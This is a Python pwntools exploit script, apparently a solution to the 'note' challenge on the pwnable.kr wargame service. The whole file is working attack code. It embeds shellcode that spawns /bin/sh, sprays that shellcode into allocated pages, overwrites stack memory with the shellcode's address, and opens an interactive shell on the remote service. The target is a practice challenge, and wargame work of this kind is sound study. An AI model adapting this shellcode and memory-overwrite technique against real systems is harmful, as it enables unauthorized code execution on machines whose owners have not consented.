from pwn import *

HOST = 'pwnable.kr'
PORT = 9019

PAGE_SIZE = 4096
MAPPED_RANGE = [
	(0x8048000, 0x804c000, "note"),
	(0xf7e17000, 0xf7fc7000, "lib"),
	(0xf7fd9000, 0xf7ffb000, "ld"),
	(0xf7ffc000, 0xf7ffe000, "ld"),
	(0xfffdd000, 0xffffe000, "stack")
]

shell = "\x31\xc0\x50\x48\x8b\x14\x24\xeb\x10\x54\x78\x06\x5e\x5f\xb0\x3b\x0f\x05\x59\x5b\x40\xb0\x0b\xcd\x80\xe8\xeb\xff\xff\xff"
shell += "/bin/sh"
shell += ('\x00' * (4 - (len(shell) % 4)))
spray_size = PAGE_SIZE / len(shell) - 1

attempt = 0

while True:
	p = remote(HOST, PORT)
	shellcode_addr = 0
	while True:
		try:
			p.sendlineafter('5. exit', '1')
			data = p.recvuntil('- Select Menu -').split('\n')
			if not data[0]: data = data[1:]
			if 'fool' in data[0]:
				print "Clear..."
				for i in range(256):
					p.sendlineafter('5. exit', '4')
					p.sendlineafter('note no?', str(i))
				continue
			note_num = int(data[0].split()[-1])
			addr = int(data[1][data[1].index('[')+1:data[1].index(']')], 16)
			is_in_range = False
			for start, end, section in MAPPED_RANGE:
				if addr >= start and addr <= end:
					print "No {}. Addr: {} in {} ~ {} => [{}]".format(note_num, hex(addr), hex(start), hex(end), section)
					is_in_range = True
					p.sendlineafter('5. exit', '2')
					p.sendlineafter('note no?', str(note_num))
					p.recvuntil('(MAX : 4096 byte)')
					if section == "stack":
						p.sendline(p32(shellcode_addr)*1024)
						print "Shellcode Address: ", hex(shellcode_addr)
					else:
						p.sendline(shell*spray_size)
						print "Shellcode Address: ", hex(addr)
					p.sendlineafter('5. exit', '5')
					p.interactive()
					break
			if not is_in_range:
				print "[SKIP] Addr: ", hex(addr)
				shellcode_addr = addr
				p.sendlineafter('5. exit', '2')		# Write shellcode
				p.sendlineafter('note no?', str(note_num))
				p.sendlineafter('(MAX : 4096 byte)', shell*spray_size)
		except Exception as e:
			attempt += 1
			print "EOF {}\n, Attempt Count: {}".format(e, attempt)
			break
	p.close()
